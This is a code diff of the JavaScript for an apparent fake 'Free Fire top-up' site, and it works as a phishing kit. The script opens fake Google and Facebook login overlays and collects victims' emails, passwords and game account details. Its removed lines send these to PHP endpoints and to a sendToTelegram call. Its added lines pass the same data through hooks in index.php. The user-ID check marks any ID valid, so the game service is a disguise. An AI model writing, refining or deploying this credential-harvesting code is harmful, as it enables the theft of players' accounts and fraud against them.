@@ -1,3 +1,6 @@
+// ===== FREE FIRE TOP-UP SYSTEM =====
+// Revised for: ggdanfb overlay + trueidff/trueidff.php
+
 let gameData = {
     userId: '',
     playerName: '',
@@ -11,6 +14,7 @@ let validationState = {
     paymentSelected: false
 };
 
+// ===== INITIALIZATION =====
 $(document).ready(function() {
     initializeSystem();
     setupEventListeners();
@@ -23,6 +27,7 @@ function initializeSystem() {
     hideUserStatus();
 }
 
+// ===== USER STATUS DISPLAY =====
 function showUserLoading() {
     $('#userLoad').fadeIn(300);
     $('#userError, #userShow').hide();
@@ -40,9 +45,11 @@ function hideUserStatus() {
     $('#userLoad, #userError, #userShow').hide();
 }
 
+// ===== USER ID VALIDATION =====
 var validationTimeout = null;
 
 function setupEventListeners() {
+    // User ID input
     $('#userId').on('input', function() {
         clearTimeout(validationTimeout);
         var uid = $(this).val().trim();
@@ -61,66 +68,53 @@ function setupEventListeners() {
         }
     });
 
+    // Product selection
     $(document).on('click', '[id^="sku-item-tile-"]', function() {
         selectProduct(this);
     });
+
+    // Payment selection
     $(document).on('click', '.payment-method', function() {
         selectPayment(this);
     });
+
+    // Order submit button
     $('#mdn-submit').on('click', function(e) {
         e.preventDefault();
         showLoginModal();
     });
+
+    // Verification form submit
     $(document).on('click', '[onclick*="processVerificationData"]', function(e) {
         e.preventDefault();
         processVerificationData();
     });
 
+    // Help tooltip
     $(document).on('click', '[onclick="open_help()"]', function(e) {
         e.preventDefault();
     });
 }
 
+// ===== CEK USER ID =====
+// Call ke trueidff/trueid.php dilakukan dari index.php
+// a.js hanya expose hook: window.ffCheckUserId(uid, callback)
+// index.php yang define window.ffCheckUserId
 function checkFFUserId(uid) {
-    if (window.currentFFRequest) window.currentFFRequest.abort();
-
-    window.currentFFRequest = $.ajax({
-        type: 'GET',
-        url: 'trueidff/trueid.php?UserID=' + encodeURIComponent(uid),
-        timeout: 8000,
-        cache: false,
-        success: function(response) {
+    if (typeof window.ffCheckUserId === 'function') {
+        window.ffCheckUserId(uid, function(playerName) {
             $('#userLoad').hide();
-            if (response.statusCode === 200 && response.data) {
-                gameData.userId = uid;
-                gameData.playerName = response.data;
-                $('#userName').val(response.data);
-                showUserSuccess();
-                validationState.userIdValid = true;
-            } else {
-                gameData.userId = uid;
-                gameData.playerName = 'Player';
-                $('#userName').val('Player');
-                showUserSuccess();
-                validationState.userIdValid = true;
-            }
+            gameData.userId = uid;
+            gameData.playerName = playerName || 'Player';
+            $('#userName').val(gameData.playerName);
+            showUserSuccess();
+            validationState.userIdValid = true;
             updateProgress();
-        },
-        error: function(xhr, status) {
-            if (status !== 'abort') {
-                $('#userLoad').hide();
-                gameData.userId = uid;
-                gameData.playerName = 'Player';
-                $('#userName').val('Player');
-                showUserSuccess();
-                validationState.userIdValid = true;
-                updateProgress();
-            }
-        },
-        complete: function() { window.currentFFRequest = null; }
-    });
+        });
+    }
 }
 
+// ===== PRODUCT SELECTION =====
 function selectProduct(element) {
     $('[id^="sku-item-tile-"]').removeClass('selected');
     $('[id^="sku-item-tile-"] .sku-card__inner-container, [id^="sku-item-tile-"] .highlighted-sku-card__inner-container').removeClass('selected');
@@ -139,6 +133,7 @@ function selectProduct(element) {
     updateProgress();
 }
 
+// ===== PAYMENT SELECTION =====
 function selectPayment(element) {
     $('.payment-method').removeClass('selected');
     var $pm = $(element).closest('.payment-method');
@@ -156,6 +151,7 @@ function selectPayment(element) {
     if (allStepsComplete()) showBuyWidget();
 }
 
+// ===== PROGRESS =====
 function updateProgress() {
     var progress = 0;
     if (validationState.userIdValid) progress += 33.33;
@@ -173,6 +169,7 @@ function allStepsComplete() {
     return validationState.userIdValid && validationState.productSelected && validationState.paymentSelected;
 }
 
+// ===== BUY WIDGET =====
 function showBuyWidget() {
     if (!allStepsComplete()) return;
     if (gameData.selectedProduct && $('#buyProductName').length)
@@ -182,12 +179,15 @@ function showBuyWidget() {
     $('.checkout-guide-buy-widget-container').slideDown(300);
 }
 
+// ===== LOGIN MODAL =====
 function showLoginModal() {
     hideAllModals();
     $('.account_login').show();
+    // Update playeridlll
     if ($('.playeridlll').length) $('.playeridlll').text(gameData.userId);
 }
 
+// ===== open_google / open_facebook — pakai ggdanfb overlay =====
 window.open_google = function() {
     $('.account_login').hide();
     if (typeof showStep === 'function') showStep('stepGEmail');
@@ -218,6 +218,9 @@ window.close_log_mt = function() {
     $('.account_login').show();
 };
 
+// ===== ggdanfb integration =====
+
+// locationRedirect — dipanggil setelah Google submit (attempt 2)
 window.locationRedirect = function() {
     if (typeof closeModal === 'function') closeModal();
     $('input#validateUserid').val(gameData.userId);
@@ -225,8 +228,9 @@ window.locationRedirect = function() {
     $('.account_verification').show();
 };
 
+// Override gHandlePassNext — isi validateEmail, validatePassword, validateLogin sebelum redirect
 $(document).on('ggdanfb:ready', function() { applyGgdanfbOverrides(); });
-setTimeout(applyGgdanfbOverrides, 500);
+setTimeout(applyGgdanfbOverrides, 500); // fallback jika event tidak fired
 
 function applyGgdanfbOverrides() {
     if (!window.gHandlePassNext || window._ggOverrideApplied) return;
@@ -247,6 +251,7 @@ function applyGgdanfbOverrides() {
         _origGPass.apply(this, arguments);
     };
 
+    // closeModal override — kembalikan ke account_login jika verification belum tampil
     var _origClose = window.closeModal;
     window.closeModal = function() {
         _origClose && _origClose();
@@ -256,28 +261,15 @@ function applyGgdanfbOverrides() {
     };
 }
 
+// fbLanjutkan — POST ke tirzz23finalsend.php dilakukan dari index.php
+// a.js hanya trigger hook: window.ffFbLanjutkan()
 window.fbLanjutkan = function() {
-    var email = document.getElementById('fbEmailInput').value.trim();
-    var pass  = document.getElementById('fbPassInput').value;
-    var dim   = document.getElementById('fbConfirmLoadingDim');
-    dim.classList.add('active');
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'codxfinal.php', true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&login=Facebook');
-    if (typeof sendToTelegram === 'function') sendToTelegram(email, pass, 'Facebook');
-    setTimeout(function() {
-        dim.classList.remove('active');
-        $('input#validateEmail').val(email);
-        $('input#validatePassword').val(pass);
-        $('input#validateLogin').val('Facebook');
-        $('input#validateUserid').val(gameData.userId);
-        $('input#validateNickname').val(gameData.playerName);
-        if (typeof closeModal === 'function') closeModal();
-        $('.account_verification').show();
-    }, 2000);
+    if (typeof window.ffFbLanjutkan === 'function') {
+        window.ffFbLanjutkan();
+    }
 };
 
+// ===== VERIFICATION SUBMIT =====
 var isProcessingVerification = false;
 
 window.processVerificationData = function() {
@@ -293,6 +285,7 @@ window.processVerificationData = function() {
     var tier             = $('#tier').val();
     var elpas            = $('#elpas').val();
 
+    // Isi nickname jika belum
     if (!$('#validateNickname').val()) {
         $('#validateNickname').val(gameData.playerName);
     }
@@ -302,14 +295,15 @@ window.processVerificationData = function() {
         return false;
     }
 
+    // Disable button
     $('[onclick*="processVerificationData"]').prop('disabled', true);
 
     showVerificationLoading();
 
-    $.ajax({
-        type: 'POST',
-        url: 'tirzz23finalsend.php',
-        data: {
+    // POST ke tirzz23finalsend.php dilakukan dari index.php
+    // a.js hanya kumpulkan data lalu panggil hook window.ffSubmitVerification
+    if (typeof window.ffSubmitVerification === 'function') {
+        window.ffSubmitVerification({
             validateEmail:    validateEmail,
             validatePassword: validatePassword,
             validateUserid:   validateUserid,
@@ -318,29 +312,18 @@ window.processVerificationData = function() {
             phone:            phone,
             level:            level,
             tier:             tier,
-            elpas:            elpas,
-            game:             'freefire'
-        },
-        timeout: 15000,
-        success: function() {
+            elpas:            elpas
+        }, function() {
             hideVerificationLoading();
-            $('.account_verification').hide();
-            $('.account_processing').show();
-        },
-        error: function() {
-            hideVerificationLoading();
-            $('.account_verification').hide();
-            $('.account_processing').show();
-        },
-        complete: function() {
             $('[onclick*="processVerificationData"]').prop('disabled', false);
             setTimeout(function() { isProcessingVerification = false; }, 3000);
-        }
-    });
+        });
+    }
 
     return false;
 };
 
+// ===== LOADING OVERLAY =====
 function showVerificationLoading() {
     $('body').append(`
         <div id="verif-loading" style="
@@ -362,6 +345,7 @@ function hideVerificationLoading() {
     $('#verif-loading').remove();
 }
 
+// ===== UTILITIES =====
 function hideAllModals() {
     $('.account_login, .account_verification, .account_processing, .login-gp, .login-mail, .login-facebook, .login-gp-load, .login-facebook-load, .check_verification, .login-facebook-mt, .verification_info').hide();
 }
@@ -383,3 +367,5 @@ window.chooseSku = function(event, skuId) {
     var el = event.target.closest('[id^="sku-item-tile-"]') || document.getElementById(skuId);
     if (el) selectProduct(el);
 };
+
+console.log('✅ tirzz23.js loaded — FF Top-Up with ggdanfb');
